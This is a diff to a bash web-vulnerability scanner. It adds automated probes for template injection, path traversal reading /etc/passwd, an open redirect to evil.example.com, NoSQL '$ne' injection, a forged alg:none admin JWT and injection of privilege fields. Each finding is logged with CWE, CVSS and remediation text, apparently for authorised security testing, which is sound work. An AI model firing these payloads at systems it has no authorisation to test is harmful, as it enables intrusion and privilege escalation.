@@ -90,15 +90,16 @@ uri_enc() { printf '%s' "$1" | jq -sRr @uri 2>/dev/null || echo "$1"; }
 # ---- Context-aware param classifier: only relevant vuln classes per param ----
 classify_param() {
   local p="$1"
-  local pname="${p%%=*}"
-  [ "$DEEP" -eq 1 ] && { echo "sqli,xss,ssrf,cmdi,idor"; return; }
+  pname="${p%%=*}"
+  [ "$DEEP" -eq 1 ] && { echo "sqli,xss,ssrf,cmdi,idor,ssti,lfi,nosqli,openredirect,jwt"; return; }
   case "$pname" in
-    *url*|*redirect*|*link*|*webhook*|*callback*|*fetch*|*src*|*dest*|*uri*|*target*|*next*|*domain*|*host*) echo "ssrf" ;;
-    *token*|*jwt*|*session*|*auth*|*api_key*|*apikey*|*key*|*secret*) echo "jwt-skip" ;;
-    *file*|*dir*|*name*|*filename*) echo "sqli,xss" ;;
+    *url*|*redirect*|*next*|*return*|*back*|*continue*|*callback*|*link*|*webhook*|*fetch*|*src*|*dest*|*uri*|*target*|*domain*|*host*) echo "ssrf,openredirect" ;;
+    *token*|*jwt*|*session*|*auth*|*api_key*|*apikey*|*key*|*secret*) echo "jwt" ;;
+    *file*|*dir*|*filename*|*path*|*download*|*upload*) echo "lfi" ;;
     *id*|*num*|*count*|*limit*|*offset*|*page*) echo "idor,sqli" ;;
-    *q*|*search*|*filter*|*sort*|*order*|*query*|*user*|*email*|*phone*|*address*|*text*|*title*|*comment*) echo "sqli,xss" ;;
-    *) echo "sqli,xss" ;;
+    *template*|*render*|*format*|*message*|*text*|*title*|*comment*|*content*|*body*) echo "ssti,sqli,xss" ;;
+    *q*|*search*|*filter*|*sort*|*order*|*query*|*user*|*email*|*phone*|*address*|*name*) echo "sqli,xss,nosqli" ;;
+    *) echo "sqli,xss,nosqli" ;;
   esac
 }
 
@@ -122,7 +123,7 @@ SQLI_FULL=(
 
 sqli_test() {
   local url="$1" p="$2"
-  local pname="${p%%=*}"
+  pname="${p%%=*}"
   local base="${url%%\?*}"
   local bv="${p#*=}"; [ -z "$bv" ] && bv="1"
   local esc=$(uri_enc "$bv")
@@ -130,8 +131,8 @@ sqli_test() {
   # PRE-PROBE: boolean pair + error trigger (cheap, 3 requests)
   local u1="$base?${pname}=${esc}$(uri_enc "' AND '1'='1")"
   local u2="$base?${pname}=${esc}$(uri_enc "' AND '1'='2")"
-  send_req GET "$u1" ""; local len1=${#REQ_BODY}; local body1="$REQ_BODY"
-  send_req GET "$u2" ""; local len2=${#REQ_BODY}
+  send_req GET "$u1" ""; len1=${#REQ_BODY}; body1="$REQ_BODY"
+  send_req GET "$u2" ""; len2=${#REQ_BODY}
   local signal=0
   echo "$body1" | grep -qiE "$SQL_ERRORS" && signal=1
   if [ $((len1 - len2)) -gt 5 ] || [ $((len2 - len1)) -gt 5 ]; then signal=1; fi
@@ -150,7 +151,7 @@ sqli_test() {
       echo "$tu|SQLI|$pname|$payload|error-based" >> "$CH_DIR/sqli_findings.txt"
       return 0
     fi
-    local t0=$(date +%s%N); send_req GET "$tu" ""; local t1=$(date +%s%N)
+    local t0=$(date +%s%N); send_req GET "$tu" ""; t1=$(date +%s%N)
     local ms=$(( (t1 - t0) / 1000000 ))
     if [ "$ms" -gt 2500 ]; then
       echo "CONFIRMED time-based ${ms}ms $url param=$pname payload=$payload" >> "$SQLI_DIR/$pname.txt"
@@ -164,7 +165,7 @@ sqli_test() {
 while IFS= read -r ep; do
   has_param "$ep" || continue
   while IFS= read -r p; do
-    [ "$(classify_param "$p")" = "jwt-skip" ] && continue
+    [ "$(classify_param "$p")" = "jwt" ] && continue
     case "$(classify_param "$p")" in
       *sqli*) sqli_test "$ep" "$p" ;;
     esac
@@ -219,7 +220,7 @@ while IFS= read -r ep; do
   clean="${ep%%\?*}"
   while IFS= read -r p; do
   pname="${p%%=*}"
-    [ "$(classify_param "$p")" = "ssrf" ] || continue
+    case "$(classify_param "$p")" in *ssrf*) ;; *) continue;; esac
     for probe in "${SSRF_PROBES[@]}"; do
       send_req GET "$clean?${pname}=$(uri_enc "$probe")" ""
       if echo "$REQ_BODY" | grep -qiE "169\.254\.169\.254|127\.0\.0\.1|root|security-credentials|ami-id"; then
@@ -292,6 +293,167 @@ IDOR_N=$(wc -l < "$CH_DIR/idor_findings.txt" 2>/dev/null || echo 0)
 [ "$IDOR_N" -gt 0 ] && { warn "  IDOR candidates: $IDOR_N"; fadd "IDOR/BOLA — object ID enumeration" HIGH SUSPECTED CWE-639 A01:2021 --cvss 7.5 --component "API" --tags "idor,chaining-primitive" --remediation "Server-side object-level authorization per request; avoid sequential IDs" "$CH_DIR/idor_findings.txt"; } || ok "  No IDOR (numeric IDs only)"
 
 # ============================================================
+# H. SSTI (server-side template injection) — text/template params
+# ============================================================
+info "=== H. SSTI (text/template params) ==="
+SSTI_DIR="$CH_DIR/results/ssti"; mkdir -p "$SSTI_DIR"
+: > "$CH_DIR/ssti_findings.txt"
+SSTI_PROBES=("{{7*7}}" '${7*7}' '#{7*7}')
+
+while IFS= read -r ep; do
+  has_param "$ep" || continue
+  clean="${ep%%\?*}"
+  while IFS= read -r p; do
+  pname="${p%%=*}"
+    case "$(classify_param "$p")" in *ssti*) ;; *) continue;; esac
+    for pl in "${SSTI_PROBES[@]}"; do
+      send_req GET "$clean?${pname}=$(uri_enc "$pl")" ""
+      if echo "$REQ_BODY" | grep -qE '49|7777777'; then
+        echo "SSTI-CANDIDATE $ep param=$pname payload=$pl" >> "$SSTI_DIR/$pname.txt"
+        echo "$ep|SSTI|$pname|$pl" >> "$CH_DIR/ssti_findings.txt"
+      fi
+    done
+  done < <(param_pairs "$ep")
+done < "$EP"
+SSTI_N=$(wc -l < "$CH_DIR/ssti_findings.txt" 2>/dev/null || echo 0)
+[ "$SSTI_N" -gt 0 ] && { warn "  SSTI candidates: $SSTI_N"; fadd "Server-Side Template Injection" HIGH SUSPECTED CWE-1336 A03:2021 --cvss 8.1 --component "API" --tags "ssti,chaining-primitive" --remediation "Never pass user input into template engines; use sandboxed/parameterized rendering" "$CH_DIR/ssti_findings.txt"; } || ok "  No SSTI (text/template params only)"
+
+# ============================================================
+# I. LFI / Path traversal — file/path params
+# ============================================================
+info "=== I. LFI / Path traversal (file/path params) ==="
+LFI_DIR="$CH_DIR/results/lfi"; mkdir -p "$LFI_DIR"
+: > "$CH_DIR/lfi_findings.txt"
+LFI_PAYLOADS=("../../../../etc/passwd" "..%2f..%2f..%2f..%2fetc/passwd" "....//....//etc/passwd")
+
+while IFS= read -r ep; do
+  has_param "$ep" || continue
+  clean="${ep%%\?*}"
+  while IFS= read -r p; do
+  pname="${p%%=*}"
+    case "$(classify_param "$p")" in *lfi*) ;; *) continue;; esac
+    for pl in "${LFI_PAYLOADS[@]}"; do
+      send_req GET "$clean?${pname}=$(uri_enc "$pl")" ""
+      if echo "$REQ_BODY" | grep -qE 'root:.*:0:0:|/bin/(ba)?sh|/etc/passwd'; then
+        echo "LFI-CANDIDATE $ep param=$pname payload=$pl" >> "$LFI_DIR/$pname.txt"
+        echo "$ep|LFI|$pname|$pl" >> "$CH_DIR/lfi_findings.txt"
+      fi
+    done
+  done < <(param_pairs "$ep")
+done < "$EP"
+LFI_N=$(wc -l < "$CH_DIR/lfi_findings.txt" 2>/dev/null || echo 0)
+[ "$LFI_N" -gt 0 ] && { warn "  LFI candidates: $LFI_N"; fadd "Local File Inclusion / Path Traversal" HIGH SUSPECTED CWE-22 A01:2021 --cvss 7.5 --component "API" --tags "lfi,chaining-primitive" --remediation "Normalize + validate file paths; allowlist; never join user input into paths" "$CH_DIR/lfi_findings.txt"; } || ok "  No LFI (file/path params only)"
+
+# ============================================================
+# J. Open Redirect — url/redirect/next params
+# ============================================================
+info "=== J. Open Redirect (redirect-style params) ==="
+OREDIR_DIR="$CH_DIR/results/open_redirect"; mkdir -p "$OREDIR_DIR"
+: > "$CH_DIR/open_redirect_findings.txt"
+OREDIR_TARGET="https://evil.example.com/"
+send_req_hdr() { # like send_req but also captures headers into REQ_HEADERS
+  local method="$1" url="$2" data="$3"
+  local args=("${CURL_BASE[@]}" -o "$CH_DIR/results/body.tmp" -D "$CH_DIR/results/headers.tmp" -w '%{http_code}')
+  case "$method" in POST) args+=(-X POST -H "Content-Type: application/json");; esac
+  [ -n "$data" ] && args+=(-d "$data")
+  REQ_CODE=$(curl "${args[@]}" "$url" 2>/dev/null)
+  REQ_BODY=""; [ -f "$CH_DIR/results/body.tmp" ] && REQ_BODY=$(cat "$CH_DIR/results/body.tmp")
+  REQ_HEADERS=""; [ -f "$CH_DIR/results/headers.tmp" ] && REQ_HEADERS=$(cat "$CH_DIR/results/headers.tmp")
+}
+
+while IFS= read -r ep; do
+  has_param "$ep" || continue
+  clean="${ep%%\?*}"
+  while IFS= read -r p; do
+  pname="${p%%=*}"
+    case "$(classify_param "$p")" in *openredirect*) ;; *) continue;; esac
+    send_req_hdr GET "$clean?${pname}=$(uri_enc "$OREDIR_TARGET")" ""
+    if echo "$REQ_CODE" | grep -qE '^30[0-9]$' && echo "$REQ_HEADERS" | grep -qi "Location:.*evil.example.com"; then
+      echo "OPEN-REDIRECT confirmed $ep param=$pname" >> "$OREDIR_DIR/$pname.txt"
+      echo "$ep|OPEN-REDIRECT|$pname|$OREDIR_TARGET|$REQ_CODE" >> "$CH_DIR/open_redirect_findings.txt"
+    fi
+  done < <(param_pairs "$ep")
+done < "$EP"
+OREDIR_N=$(wc -l < "$CH_DIR/open_redirect_findings.txt" 2>/dev/null || echo 0)
+[ "$OREDIR_N" -gt 0 ] && { warn "  Open redirect confirmed: $OREDIR_N"; fadd "Open Redirect on redirect-style parameter" MEDIUM SUSPECTED CWE-601 A01:2021 --cvss 4.7 --component "API" --tags "open-redirect,chaining-primitive" --remediation "Validate redirect target against an allowlist of trusted hosts" "$CH_DIR/open_redirect_findings.txt"; } || ok "  No open redirect (redirect-style params only)"
+
+# ============================================================
+# K. NoSQLi — MongoDB operator injection on text params
+# ============================================================
+info "=== K. NoSQLi (operator injection) ==="
+NOSQLI_DIR="$CH_DIR/results/nosqli"; mkdir -p "$NOSQLI_DIR"
+: > "$CH_DIR/nosqli_findings.txt"
+
+while IFS= read -r ep; do
+  has_param "$ep" || continue
+  clean="${ep%%\?*}"
+  while IFS= read -r p; do
+  pname="${p%%=*}" bv="${p#*=}"; [ -z "$bv" ] && bv="1"
+    case "$(classify_param "$p")" in *nosqli*) ;; *) continue;; esac
+    # boolean pair: normal vs $ne operator
+    send_req GET "$clean?${pname}=$(uri_enc "$bv")" ""; base_len=${#REQ_BODY}
+    send_req GET "$clean?${pname}[$(uri_enc '$ne')]=$(uri_enc 'nonexistent_value_zz')" ""; ne_len=${#REQ_BODY}
+    if [ $((base_len - ne_len)) -gt 5 ] || [ $((ne_len - base_len)) -gt 5 ]; then
+      echo "NOSQLI-CANDIDATE $ep param=$pname (len $base_len->$ne_len)" >> "$NOSQLI_DIR/$pname.txt"
+      echo "$ep|NOSQLI|$pname|\$ne|len-diff" >> "$CH_DIR/nosqli_findings.txt"
+    fi
+  done < <(param_pairs "$ep")
+done < "$EP"
+NOSQLI_N=$(wc -l < "$CH_DIR/nosqli_findings.txt" 2>/dev/null || echo 0)
+[ "$NOSQLI_N" -gt 0 ] && { warn "  NoSQLi candidates: $NOSQLI_N"; fadd "NoSQL injection (\$ne operator)" HIGH SUSPECTED CWE-943 A03:2021 --cvss 8.1 --component "API" --tags "nosqli,chaining-primitive" --remediation "Use typed bindings / parameterised queries for NoSQL; reject operator keys" "$CH_DIR/nosqli_findings.txt"; } || ok "  No NoSQLi"
+
+# ============================================================
+# L. JWT tampering (alg:none) — token params
+# ============================================================
+info "=== L. JWT tampering (alg:none) — token params ==="
+JWT_DIR="$CH_DIR/results/jwt"; mkdir -p "$JWT_DIR"
+: > "$CH_DIR/jwt_findings.txt"
+b64url() { printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '='; }
+
+while IFS= read -r ep; do
+  has_param "$ep" || continue
+  clean="${ep%%\?*}"
+  while IFS= read -r p; do
+  pname="${p%%=*}"
+    case "$(classify_param "$p")" in *jwt*) ;; *) continue;; esac
+  h=$(b64url '{"alg":"none","typ":"JWT"}')
+  pay=$(b64url '{"sub":"admin","role":"admin","admin":true}')
+  forged="$h.$pay."
+    send_req GET "$clean?${pname}=$forged" ""
+    if echo "$REQ_CODE" | grep -qE '^2[0-9][0-9]$'; then
+      echo "JWT-ALGNONE accepted $ep param=$pname (HTTP $REQ_CODE)" >> "$JWT_DIR/$pname.txt"
+      echo "$ep|JWT-ALG-NONE|$pname|$forged|$REQ_CODE" >> "$CH_DIR/jwt_findings.txt"
+    fi
+  done < <(param_pairs "$ep")
+done < "$EP"
+JWT_N=$(wc -l < "$CH_DIR/jwt_findings.txt" 2>/dev/null || echo 0)
+[ "$JWT_N" -gt 0 ] && { warn "  JWT alg:none accepted: $JWT_N"; fadd "JWT alg:none / signature bypass accepted" CRITICAL SUSPECTED CWE-345 A07:2021 --cvss 9.1 --component "API" --tags "jwt,chaining-primitive" --remediation "Reject alg:none; pin algorithm; verify signature with strong key" "$CH_DIR/jwt_findings.txt"; } || ok "  No JWT alg:none acceptance"
+
+# ============================================================
+# M. Mass assignment (privilege field injection on write endpoints)
+# ============================================================
+info "=== M. Mass assignment (privilege injection) ==="
+MASS_DIR="$CH_DIR/results/mass_assignment"; mkdir -p "$MASS_DIR"
+: > "$CH_DIR/mass_assignment_findings.txt"
+
+while IFS= read -r ep; do
+  has_param "$ep" || continue
+  clean="${ep%%\?*}"
+  send_req POST "$clean" '{"role":"admin","isAdmin":true,"permissions":["*"]}'
+  code_post="$REQ_CODE" body_post="$REQ_BODY"
+  send_req POST "$clean" '{}'
+  body_base="$REQ_BODY"
+  if [ "$code_post" != "500" ] && [ "$code_post" != "404" ]; then
+    if echo "$body_post" | grep -qiE '"(role|isAdmin|permissions|admin)"\s*:' || [ "${#body_post}" != "${#body_base}" ]; then
+      echo "MASS-ASSIGNMENT-CANDIDATE $ep (POST accepted injected privilege fields)" >> "$MASS_DIR/endpoint.txt"
+      echo "$ep|MASS-ASSIGNMENT|POST|role/admin injected" >> "$CH_DIR/mass_assignment_findings.txt"
+    fi
+  fi
+done < "$EP"
+MASS_N=$(wc -l < "$CH_DIR/mass_assignment_findings.txt" 2>/dev/null || echo 0)
+[ "$MASS_N" -gt 0 ] && { warn "  Mass assignment candidates: $MASS_N"; fadd "Mass Assignment — privilege field injection accepted" HIGH SUSPECTED CWE-915 A04:2021 --cvss 7.1 --component "API" --tags "mass-assignment,chaining-primitive" --remediation "Allowlist bindable fields; never bind role/permissions from user input" "$CH_DIR/mass_assignment_findings.txt"; } || ok "  No mass assignment signal"
+
+# ============================================================
 # G. Vulnerability chaining
 # ============================================================
 info "=== G. Building vulnerability chains ==="
@@ -338,7 +500,8 @@ CHAINS="$CH_DIR/chains.md"
   [ -s "$CHAINS" ] || { echo "No chains formed — findings below threshold."; echo ""; }
 } >> "$CHAINS"
 
-info "=== H. Summary ==="
+info "=== Summary ==="
 echo "  SQLi: $SQLI_N | XSS: $XSS_N | SSRF: $SSRF_N | CMDi: $CMDI_N | IDOR: $IDOR_N"
+echo "  SSTI: $SSTI_N | LFI: $LFI_N | OpenRedirect: $OREDIR_N | NoSQLi: $NOSQLI_N | JWT: $JWT_N | MassAssignment: $MASS_N"
 ok "Vuln chaining report: $CHAINS"
 ok "Findings recorded via fadd (see 08_findings_report)"
